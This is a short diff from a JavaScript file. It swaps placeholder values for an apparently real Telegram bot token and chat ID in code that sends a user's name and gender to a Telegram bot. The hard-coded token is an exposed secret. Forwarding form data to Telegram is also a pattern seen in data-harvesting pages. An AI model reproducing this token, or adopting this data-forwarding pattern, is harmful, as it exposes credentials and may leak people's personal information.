@@ -78,8 +78,8 @@
 
             // Send data to Telegram bot
             const telegramBotToken =
-              "YOUR_TELEGRAM_BOT_TOKEN"; // Replace with your bot token
-            const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID (ensure it's numeric)
+              "7893506126:AAEfbbIrs6rRgIpchTgZjp9iT1zHXpo5UMg"; // Replace with your bot token
+            const chatId = "1208908312"; // Replace with your chat ID (ensure it's numeric)
             const message = `User Information:
 Name: ${username}
 Gender: ${gender}
